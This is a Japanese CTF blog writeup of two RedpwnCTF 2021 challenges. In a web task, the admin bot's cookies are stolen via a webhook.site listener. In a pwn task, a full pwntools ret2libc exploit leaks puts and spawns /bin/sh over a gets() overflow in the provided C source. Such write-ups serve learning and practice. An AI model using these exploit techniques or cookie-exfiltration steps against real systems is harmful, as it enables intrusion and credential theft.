---
title: "RedpwnCTF 2021 Writeup"
date: 2021-07-17T09:00:00+09:00
lastmod: 2021-07-17T09:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fredpwnctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://2021.redpwn.net/](https://2021.redpwn.net/)
<br /><br />

1146点を獲得し、最終順位は317位でした。<br />

<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_score.png" alt="redpwnctf_2021_score.png">

解いたチャレンジ<br />

<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_solves1.png" alt="redpwnctf_2021_solves1.png">

<br /><br />

最近たまに見るこの [rCTF](https://rctf.redpwn.net/) という Platform は redpwn CTF team が作ったものみたいですね。

<br /><br />
自分の過去のブログを見たときに、[RedpwnCTF 2019 の Writeup](https://captureamerica.github.io/writeups/post/redpwnctf_2019/) は書いてたけど RedpwnCTF 2020 の Writeup が無かったので、去年はイベントを見逃したのかな？と思ったら、パソコン上にメモは残っていたのでいちおう参加はしてたみたいです。簡単なのしか解いていなかったからブログを書かなかったのかな。

そして、今年も簡単なのしか解いていないですが、とりあえず少しだけ記録として残しておきます。




<br /><br />
<br /><br />
## [Web]: pastebin-1 (about 100 points)
- - -
### Challenge
> Ah, the classic pastebin. Can you get the admin's cookies?
<br /><br />
pastebin-1.mc.ax  (pastebinへのリンク)
<br /><br />
Admin bot  (admin botへのリンク)

Attachment:

- main.rs

<br>

### Solution
[https://webhook.site/](https://webhook.site/) を使って解きました。

1. webhook.site で待受けを開始してアドレスを取得。

2. 以下をPastebinのところにPost。<br>
<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_pastebin1.png" alt="redpwnctf_2021_pastebin1.png">

3. admin-botから、以下 (PastebinにPostしたときに得られるアドレス) へアクセス。<br>
<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_pastebin2.png" alt="redpwnctf_2021_pastebin2.png">

4. webhook.site で受信したデータを確認。<br>
<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_pastebin3.png" alt="redpwnctf_2021_pastebin3.png">

<br />

Flag: `flag{d1dn7_n33d_70_b3_1n_ru57}`



<br /><br />
<br /><br />
## [Pwn]: ret2the-unknown (about 100 points)
- - -
### Challenge
> hey, my company sponsored map doesn't show any location named "libc"!
<br /><br />
nc mc.ax 31568

Attachment:

- libc-2.28.so
- ld-2.28.so
- ret2the-unknown (ELF 64bit)
- ret2the-unknown.c

ret2the-unknown.c の中身：

```C
#include <stdio.h>
#include <string.h>

int main(void)
{
  char your_reassuring_and_comforting_we_will_arrive_safely_in_libc[32];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("that board meeting was a *smashing* success! rob loved the challenge!");
  puts("in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...");
  puts("where is this place? can you help me get there safely?");

  // please i cant afford the medical bills if we crash and segfault
  gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc);

  puts("phew, good to know. shoot! i forgot!");
  printf("rob said i'd need this to get there: %llx\n", printf);
  puts("good luck!");
}
```

<br>

### Solution
以下、checksecの出力結果です。

<pre>
$ checksec ret2the-unknown
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre>

<br>

以下、ほとんど今までのコードの使いまわしです。。。

{{< highlight python "linenos=table,hl_lines=" >}}
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context(os='linux', arch='amd64')
context.log_level = 'critical'

elf = ELF('./ret2the-unknown')
context.binary = elf

s = remote('mc.ax', 31568)

bufsize = 32 + 8
rop = ROP(elf)
rop.puts(elf.got.puts)
rop.main()
print(rop.dump())
s.sendlineafter("safely?\n", b'A'*bufsize + rop.chain())
s.recvuntil('luck!\n')
puts = u64(s.recvline().rstrip().ljust(8, b"\x00"))
print('puts: %x' % puts)
libc = ELF('./libc-2.28.so')
libc.address = puts - libc.symbols.puts

rop = ROP(libc)
rop.execv(next(libc.search(b'/bin/sh')), 0)
print(rop.dump())
s.sendlineafter("safely?\n", b'A'*bufsize + rop.chain())
s.recvuntil('luck!\n')
s.interactive()	
{{< / highlight >}}

<br />

Flag: `flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}`




<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />